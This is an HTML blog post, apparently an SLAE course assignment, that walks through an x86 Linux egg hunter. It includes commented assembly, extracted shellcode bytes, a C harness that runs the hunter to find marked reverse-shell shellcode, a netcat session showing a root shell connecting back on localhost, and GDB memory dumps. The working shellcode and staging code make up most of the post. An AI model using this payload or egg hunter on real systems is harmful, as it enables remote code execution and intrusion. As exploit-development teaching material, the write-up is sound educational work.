@@ -1,0 +1,495 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Brett Lischalk | SLAE Problem 3: Egg Hunter Demonstration</title>
+  <meta name="description" content="A demonstration of an egg hunter searching for shellcode">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="SLAE Problem 3: Egg Hunter Demonstration">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="http://brettlischalk.com//posts/slae-problem-3-egghunter-demo">
+  <meta property="og:description" content="A demonstration of an egg hunter searching for shellcode">
+  <meta property="og:site_name" content="Brett Lischalk">
+  <meta property="og:image" content="http://brettlischalk.com//assets/og-image.jpg">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="http://brettlischalk.com//posts/slae-problem-3-egghunter-demo">
+  <meta name="twitter:title" content="SLAE Problem 3: Egg Hunter Demonstration">
+  <meta name="twitter:description" content="A demonstration of an egg hunter searching for shellcode">
+  <meta name="twitter:image" content="http://brettlischalk.com//assets/og-image.jpg">
+
+  <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
+  <link href="http://brettlischalk.com//feed.xml" type="application/rss+xml" rel="alternate" title="Brett Lischalk Last 10 blog posts" />
+
+  
+    <link type="text/css" rel="stylesheet" href="/assets/dark.css">
+  
+</head>
+
+<body>
+  <main role="main">
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav reveal">
+  <a href="/" class="header-logo" title="Brett Lischalk">Brett Lischalk</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <span class="icon icon-android-person"></span>
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/blischalk" target="_blank" title="Twitter">
+          <span class="icon icon-social-twitter"></span>
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a href="https://github.com/blischalk" target="_blank" title="GitHub">
+          <span class="icon icon-social-github"></span>
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/brett-lischalk-3104537" target="_blank" title="LinkedIn">
+          <span class="icon icon-social-linkedin"></span>
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a href="mailto:brett@brettlischalk.com" target="_blank" title="Email">
+          <span class="icon icon-at"></span>
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="/feed.xml" target="_blank" title="RSS">
+          <span class="icon icon-social-rss"></span>
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+        <article class="article reveal">
+          <header class="article-header">
+            <h1>SLAE Problem 3: Egg Hunter Demonstration</h1>
+            <div class="article-list-footer">
+              <span class="article-list-date">
+                December 22, 2016
+              </span>
+              <span class="article-list-divider">-</span>
+              <span class="article-list-minutes">
+                
+                
+                  9 minute read
+                
+              </span>
+              <span class="article-list-divider">-</span>
+              <div class="article-list-tags">
+                
+                  <a href="/tag/asm">asm</a>
+                
+                  <a href="/tag/shellcode">shellcode</a>
+                
+                  <a href="/tag/c">c</a>
+                
+                  <a href="/tag/egg">egg</a>
+                
+                  <a href="/tag/hunter">hunter</a>
+                
+              </div>
+            </div>
+          </header>
+
+          <div class="article-content">
+            <h1 id="assignment-3">Assignment 3</h1>
+
+<p>This blog post has been created for completing the requirements for the SecurityTube
+Linux Assembly Expert certification:
+<a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert"><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert</a></a></p>
+
+<p>Student ID: SLAE-824</p>
+
+<h2 id="requirements">Requirements</h2>
+
+<ul>
+  <li>Study about Egg Hunter Shellcode</li>
+  <li>Create a working egghunter demo</li>
+  <li>Make demo configurable for different payloads</li>
+</ul>
+
+<h2 id="background">Background</h2>
+
+<p>So what exactly is an “egghunter”? Well recently I embarked upon the
+<a href="https://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/">OSCE course</a>
+from <a href="https://www.offensive-security.com">Offensive Security</a> and learned just
+that… Although I have yet to pass the exam :(</p>
+
+<p>Anyhow, essentially what an “egghunter” does is search through memory and
+locate a marker. Once this marker has been found it jumps to the next
+instruction which is generally a malicous payload that was preceded with
+the marker. So for example:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>0xdeadbeef w00tw00t
+0xxxxxxxxx malicious
+0xxxxxxxxx code
+0xxxxxxxxx here
+...snip...
+</code></pre>
+</div>
+
+<p>The egghunter code would search all of the memory within the process until it
+came upon <code class="highlighter-rouge">0xdeadbeef</code>. Once it looked at the value at that address, it would
+find the marker bytes that it was looking for and proceed to execute the
+instruction at the memory address immediately following the marker.</p>
+
+<h2 id="strategy">Strategy</h2>
+
+<p>So how will we demonstrate such a feat? Well, we will attempt to:</p>
+
+<ul>
+  <li>Create a C program that will create a decent sized uninitialized buffer of memory.</li>
+  <li>Copy some marked shellcode into the buffer at run time within our main function. This will simulate a piece of marked shellcode landing during a bufferoverflow.</li>
+  <li>Write our egghunter code in assembly and extract the bytes as we have been doing from our previous exam problems.</li>
+  <li>Cast the egghunter bytes to a function pointer and execute</li>
+</ul>
+
+<p>If all goes well our egghunter should find the shellcode we placed in the buffer and execute it.</p>
+
+<h2 id="helpful-resources">Helpful Resources</h2>
+
+<p>Some great resources on the topic:</p>
+
+<ul>
+  <li><a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">skape egghunter paper</a>. Egghunter writing methodology.</li>
+  <li><a href="http://www.tldp.org/LDP/tlk/mm/memory.html">Memory Paging on Linux</a>. Helps fill in some of knowledge gaps of the Egghunter methodology.</li>
+  <li><a href="http://duartes.org/gustavo/blog/post/anatomy-of-a-program-in-memory/">Another Memory Paging Article</a></li>
+  <li><a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/">corelan.be</a>. Great exploit tutorials.</li>
+  <li><a href="http://www.fuzzysecurity.com/tutorials/expDev/4.html">fuzzysecurity</a>. More great tutorials.</li>
+</ul>
+
+<h2 id="the-assembly">The Assembly</h2>
+
+<p>I’m glad I did a little research on writing egghunters before I
+started writing one because I learned that my naive implementation
+wouldn’t have worked. My initial thought was to just load up an
+address in memory and to start comparing bytes looking for my
+marker. As I was reminded this would have ended up resulting in
+a SIGSEGV. All virtual memory from lowest to highest addresses
+is NOT accessible to a program and attempts to access it will result
+in a SIGSEGV exception. This should have been obvious to me as segfaults
+when playing around with bufferoverflows occur because memory that
+has not been allocated by/for the program is attempting to be accessed.
+Due to the kernel reserving memory, ASLR memory randomization leaving
+un-allocated chunks of memory between the memory segments, as well
+as un-allocated memory between the stack and heap to allow both room
+to grow, there are quite a few places where an egghunter that simply
+just tries to dereference every memory address would fail.
+According to <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">skape egghunter paper</a>
+one way that we can work around this is by utilizing system calls.</p>
+
+<p>Since system calls work in Kernel Mode. Attempts at accessing memory
+that is not accessible to our process will not segfault but will
+raise a more friendly exception instead. The egghunters that are
+presented in the skape paper leverage this technique. We will utilize
+the <code class="highlighter-rouge">access(2) revisited</code> egghunter in our demonstration.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">  <span class="kr">global</span> <span class="n">_start</span>
+  <span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
+    <span class="n">_start</span><span class="o">:</span>
+      <span class="c">;; Clear out edx. We will use</span>
+      <span class="c">;; this to keep track of the memory</span>
+      <span class="c">;; that we are searching</span>
+      <span class="k">xor</span> <span class="n">edx</span><span class="p">,</span><span class="n">edx</span>
+    <span class="n">initpage</span><span class="o">:</span>
+      <span class="c">;; Initialize edx to PAGE_SIZE 0x1000 or 4096 bytes</span>
+      <span class="k">or</span> <span class="n">dx</span><span class="p">,</span><span class="mh">0xfff</span>
+    <span class="n">incpage</span><span class="o">:</span>
+      <span class="k">inc</span> <span class="n">edx</span>
+      <span class="c">;; Load the address 4 bytes past edx into ebx</span>
+      <span class="c">;; We do this so we can compare 8 bytes</span>
+      <span class="c">;; e.g w00tw00t</span>
+      <span class="k">lea</span> <span class="n">ebx</span><span class="p">,</span><span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span>
+      <span class="c">;; Push the access(2) syscall number onto the stack</span>
+      <span class="c">;; This pushes a 32-bit or 4 byte value onto</span>
+      <span class="c">;; the stack as 0x00000021</span>
+      <span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x21</span>
+      <span class="c">;; Place the syscall number into eax</span>
+      <span class="c">;; Since we used a push pop to set eax</span>
+      <span class="c">;; we get the top 3 bytes zeroed out without</span>
+      <span class="c">;; having to worry about what their values were previously</span>
+      <span class="c">;; this saves a byte over xor</span>
+      <span class="k">pop</span> <span class="n">eax</span>
+      <span class="c">;; Call our access system call</span>
+      <span class="k">int</span> <span class="mh">0x80</span>
+      <span class="c">;; Look at the result of the syscall.</span>
+      <span class="c">;; If it is  0xf2 which represents the low byte</span>
+      <span class="c">;;of the EFAULT return value</span>
+      <span class="k">cmp</span> <span class="n">al</span><span class="p">,</span><span class="mh">0xf2</span>
+      <span class="c">;; We looked at invalid memory so go back</span>
+      <span class="c">;; and increment the page and start again</span>
+      <span class="k">jz</span> <span class="n">initpage</span>
+      <span class="c">;; Otherwise start looking for our marker</span>
+      <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span><span class="mh">0x50905090</span>
+      <span class="c">;; scasd compares the value in eax with</span>
+      <span class="c">;; with the a double word pointed to by edi</span>
+      <span class="c">;; as such, we move the address in edx into edi</span>
+      <span class="k">mov</span> <span class="n">edi</span><span class="p">,</span><span class="n">edx</span>
+      <span class="c">;; and compare our marker</span>
+      <span class="c">;; scasd is auto incremented (or decremented)</span>
+      <span class="k">scasd</span>
+      <span class="c">;; if it doesn't match, go increment our page</span>
+      <span class="c">;; and try again</span>
+      <span class="k">jnz</span> <span class="n">incpage</span>
+      <span class="c">;; if it does match, fingers crossed...</span>
+      <span class="c">;; check the next 4 bytes</span>
+      <span class="c">;; Since scasd auto increments edi, we are</span>
+      <span class="c">;; looking at edi+4 now</span>
+      <span class="k">scasd</span>
+      <span class="c">;; if we don't have a match, no soup for us</span>
+      <span class="c">;; increment our page and try again</span>
+      <span class="k">jnz</span> <span class="n">incpage</span>
+      <span class="c">;; if we had a match, scasd incremented edit</span>
+      <span class="c">;; once again so when we jump there we should</span>
+      <span class="c">;; be jumping to our shellcode!</span>
+      <span class="k">jmp</span> <span class="n">edi</span></code></pre></figure>
+
+<p>Cool. We have some egghunter code, lets setup an example program to
+test it out. We will first compile and dump the bytes of our egghunter:</p>
+
+<p><code class="highlighter-rouge">./compile egghunter</code></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">objdump -d ./egghunter|grep <span class="s1">'[0-9a-f]:'</span><span class="se">\</span>
+| grep -v <span class="s1">'file'</span>|cut -f2 -d:|cut -f1-6 -d<span class="s1">' '</span><span class="se">\</span>
+|tr -s <span class="s1">' '</span>|tr <span class="s1">'\t'</span> <span class="s1">' '</span> |sed <span class="s1">'s/ $//g'</span>|sed <span class="s1">'s/ /\\x/g'</span><span class="se">\</span>
+|paste -d <span class="s1">''</span> -s |sed <span class="s1">'s/^/"/'</span>|sed <span class="s1">'s/$/"/g'</span>
+
+<span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">ca</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">21</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">3c</span><span class="se">\x</span><span class="s2">f2</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">ee</span><span class="se">\x</span><span class="s2">b8</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">d7</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">e6</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">e7"</span></code></pre></figure>
+
+<p>We will leverage our reverse shell from our previous
+tutorial.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> \
+<span class="s">"</span><span class="se">\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xc9\xb9\x80</span><span class="s">\x1\x1\x2"</span>
+<span class="s">"</span><span class="se">\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x11\x5c\x43\x66\x53\x89\xe1</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x31\xc0\xb0</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80</span><span class="s">"</span><span class="p">;</span></code></pre></figure>
+
+<p>Create our c program demo</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="cp">#define EGG "\x50\x90\x50\x90"
+</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">egghunter</span><span class="p">[]</span> <span class="o">=</span> \
+<span class="s">"</span><span class="se">\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x3c\xf2\x74\xee\xb8</span><span class="s">"</span>
+<span class="n">EGG</span>
+<span class="s">"</span><span class="se">\x89\xd7\xaf\x75\xe9\xaf\x75</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xe6\xff\xe7</span><span class="s">"</span><span class="p">;</span>
+
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> \
+<span class="n">EGG</span>
+<span class="n">EGG</span>
+<span class="s">"</span><span class="se">\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xc9\xb9\x80</span><span class="s">\x1\x1\x2"</span>
+<span class="s">"</span><span class="se">\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x11\x5c\x43\x66\x53\x89\xe1</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x31\xc0\xb0</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80</span><span class="s">"</span><span class="p">;</span>
+
+
+<span class="n">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">shellcode_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Egghunter Length:  %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">egghunter</span><span class="p">));</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode Length:  %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">shellcode_len</span><span class="p">);</span>
+
+    <span class="c1">// Create a buffer to place our shellcode
+</span>    <span class="kt">char</span> <span class="o">*</span><span class="n">badbuffer</span><span class="p">;</span>
+    <span class="n">badbuffer</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="n">shellcode_len</span><span class="p">);</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">badbuffer</span><span class="p">,</span><span class="n">shellcode</span><span class="p">,</span><span class="n">shellcode_len</span><span class="p">);</span>
+
+	<span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">egghunter</span><span class="p">;</span>
+	<span class="n">ret</span><span class="p">();</span>
+
+    <span class="n">free</span><span class="p">(</span><span class="n">badbuffer</span><span class="p">);</span>
+
+<span class="p">}</span></code></pre></figure>
+
+<p>If we compile our egghunterdemo.c using <code class="highlighter-rouge">gcc -g egghunterdemo.c -o egghunterdemo</code>,
+start a netcat listener on port 444 (as our shellcode is a reverse shell) using
+<code class="highlighter-rouge">netcat -nlvp 4444</code> and then execute our egghunter using <code class="highlighter-rouge">./egghunterdemo</code> we
+will see that we indeed get a connection back from our shellcode~</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">root@blahblah:~/shared/SLAE/slae/exercise3# </span>nc -nlvp 4444
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>127.0.0.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1] 37323
+id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span></code></pre></figure>
+
+<p>To prove that there is nothing up our sleves, lets hook GDB and inspect where
+everything is in memory.</p>
+
+<p>Right before we execute our egghunter the memory is laid out as such:</p>
+
+<h3 id="egghunter">Egghunter</h3>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">(</span>gdb<span class="o">)</span>  x/40xb egghunter
+0x8049880 &lt;egghunter&gt;:	    0x31	0xd2	0x66	0x81	0xca	0xff	0x0f	0x42
+0x8049888 &lt;egghunter+8&gt;:	0x8d	0x5a	0x04	0x6a	0x21	0x58	0xcd	0x80
+0x8049890 &lt;egghunter+16&gt;:	0x3c	0xf2	0x74	0xee	0xb8	0x50	0x90	0x50
+0x8049898 &lt;egghunter+24&gt;:	0x90	0x89	0xd7	0xaf	0x75	0xe9	0xaf	0x75
+0x80498a0 &lt;egghunter+32&gt;:	0xe6	0xff	0xe7	0x00	0x00	0x00	0x00	0x00</code></pre></figure>
+
+<h3 id="shellcode-buffer">Shellcode Buffer</h3>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">(</span>gdb<span class="o">)</span> x/104xb badbuffer
+0x804a008:	0x50	0x90	0x50	0x90	0x50	0x90	0x50	0x90
+0x804a010:	0x31	0xc0	0xb0	0x66	0x31	0xdb	0xb3	0x01
+0x804a018:	0x31	0xc9	0x51	0x53	0x6a	0x02	0x89	0xe1
+0x804a020:	0xcd	0x80	0x31	0xff	0x89	0xc7	0x31	0xc0
+0x804a028:	0xb0	0x66	0x31	0xc9	0xb9	0x80	0x01	0x01
+0x804a030:	0x02	0x81	0xe9	0x01	0x01	0x01	0x01	0x51
+0x804a038:	0x66	0x68	0x11	0x5c	0x43	0x66	0x53	0x89
+0x804a040:	0xe1	0x6a	0x10	0x51	0x57	0x89	0xe1	0x43
+0x804a048:	0xcd	0x80	0x31	0xc9	0xb1	0x02	0x31	0xc0
+0x804a050:	0xb0	0x3f	0xcd	0x80	0x49	0x79	0xf9	0x31
+0x804a058:	0xc0	0xb0	0x0b	0x31	0xdb	0x53	0x68	0x2f
+0x804a060:	0x2f	0x73	0x68	0x68	0x2f	0x62	0x69	0x6e
+0x804a068:	0x89	0xe3	0x31	0xc9	0x31	0xd2	0xcd	0x80</code></pre></figure>
+
+<p>Wee can see that our egghunter code and our buffer are in fact in two
+separate places within memory. We add a breakpoint at the beginning of
+our egghunter code:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">(</span>gdb<span class="o">)</span> disassemble
+Dump of assembler code <span class="k">for function </span>egghunter:
+<span class="gp">=&gt; </span>0x08049880 &lt;+0&gt;:	xor    edx,edx
+   0x08049882 &lt;+2&gt;:	or     dx,0xfff
+   0x08049887 &lt;+7&gt;:	inc    edx
+   0x08049888 &lt;+8&gt;:	lea    ebx,[edx+0x4]
+   0x0804988b &lt;+11&gt;:	push   0x21
+   0x0804988d &lt;+13&gt;:	pop    eax
+   0x0804988e &lt;+14&gt;:	int    0x80
+   0x08049890 &lt;+16&gt;:	cmp    al,0xf2
+   0x08049892 &lt;+18&gt;:	je     0x8049882 &lt;egghunter+2&gt;
+   0x08049894 &lt;+20&gt;:	mov    eax,0x90509050
+   0x08049899 &lt;+25&gt;:	mov    edi,edx
+   0x0804989b &lt;+27&gt;:	scas   eax,DWORD PTR es:[edi]
+   0x0804989c &lt;+28&gt;:	jne    0x8049887 &lt;egghunter+7&gt;
+   0x0804989e &lt;+30&gt;:	scas   eax,DWORD PTR es:[edi]
+   0x0804989f &lt;+31&gt;:	jne    0x8049887 &lt;egghunter+7&gt;
+   0x080498a1 &lt;+33&gt;:	jmp    edi
+   0x080498a3 &lt;+35&gt;:	add    BYTE PTR <span class="o">[</span>eax],al</code></pre></figure>
+
+<p>We place another breakpoint at our <code class="highlighter-rouge">jmp edi</code> instruction.
+If this instruction is hit and executes it means that our
+egghunter has found our marker and that it is about to
+execute the code right after our marker. As we can see
+in the gdb output our <code class="highlighter-rouge">jmp edi</code> does in fact get hit.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">(</span>gdb<span class="o">)</span> disassemble
+Dump of assembler code <span class="k">for function </span>egghunter:
+   0x08049880 &lt;+0&gt;:	xor    edx,edx
+   0x08049882 &lt;+2&gt;:	or     dx,0xfff
+   0x08049887 &lt;+7&gt;:	inc    edx
+   0x08049888 &lt;+8&gt;:	lea    ebx,[edx+0x4]
+   0x0804988b &lt;+11&gt;:	push   0x21
+   0x0804988d &lt;+13&gt;:	pop    eax
+   0x0804988e &lt;+14&gt;:	int    0x80
+   0x08049890 &lt;+16&gt;:	cmp    al,0xf2
+   0x08049892 &lt;+18&gt;:	je     0x8049882 &lt;egghunter+2&gt;
+   0x08049894 &lt;+20&gt;:	mov    eax,0x90509050
+   0x08049899 &lt;+25&gt;:	mov    edi,edx
+   0x0804989b &lt;+27&gt;:	scas   eax,DWORD PTR es:[edi]
+   0x0804989c &lt;+28&gt;:	jne    0x8049887 &lt;egghunter+7&gt;
+   0x0804989e &lt;+30&gt;:	scas   eax,DWORD PTR es:[edi]
+   0x0804989f &lt;+31&gt;:	jne    0x8049887 &lt;egghunter+7&gt;
+<span class="gp">=&gt; </span>0x080498a1 &lt;+33&gt;:	jmp    edi
+   0x080498a3 &lt;+35&gt;:	add    BYTE PTR <span class="o">[</span>eax],al</code></pre></figure>
+
+<p>We allow the program to continue and we end up with our
+reverse shell connection.</p>
+
+          </div>
+
+          <div class="article-share">
+            
+            <a href="" title="Share on Twitter" onclick="window.open('https://twitter.com/home?status=SLAE Problem 3: Egg Hunter Demonstration - http://brettlischalk.com//posts/slae-problem-3-egghunter-demo by @blischalk', 'newwindow', 'width=500, height=225'); return false;">
+              <span class="icon icon-social-twitter"></span>
+            </a>
+            <a href="" title="Share on Facebook" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=http://brettlischalk.com//posts/slae-problem-3-egghunter-demo', 'newwindow', 'width=500, height=500'); return false;">
+              <span class="icon icon-social-facebook"></span>
+            </a>
+            <a href="" title="Share on Google+" onclick="window.open('https://plus.google.com/share?url=http://brettlischalk.com//posts/slae-problem-3-egghunter-demo', 'newwindow', 'width=550, height=400'); return false;">
+              <span class="icon icon-social-googleplus"></span>
+            </a>
+          </div>
+
+          <a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional" target="_blank">
+            <img src="/assets/offsec-student-certified-emblem-rgb-oscp.png"" />
+          </a>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script>
+              (function() {
+                  var d = document, s = d.createElement('script');
+                  s.src = '//blischalkblog.disqus.com/embed.js';
+                  s.setAttribute('data-timestamp', +new Date());
+                  (d.head || d.body).appendChild(s);
+              })();
+            </script>
+            <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+          
+        </article>
+        <footer class="footer reveal">
+  <p>
+    Site content by: <a href="/about" title="About me">Brett Lischalk</a>.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  <script type="text/javascript" src="/assets/vendor.js"></script>
+<script type="text/javascript" src="/assets/application.js"></script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.16/webfont.js"></script>
+<script>
+  WebFont.load({
+    google: {
+      families: ['Cormorant Garamond:700', 'Lato:300,400,700']
+    }
+  });
+</script>
+
+
+  <script>
+    window.ga=function(){ga.q.push(arguments)};ga.q=[];ga.l=+new Date;
+    ga('create','UA-4121143-2','auto');ga('send','pageview')
+  </script>
+  <script src="https://www.google-analytics.com/analytics.js" async defer></script>
+
+
+</body>
+</html>
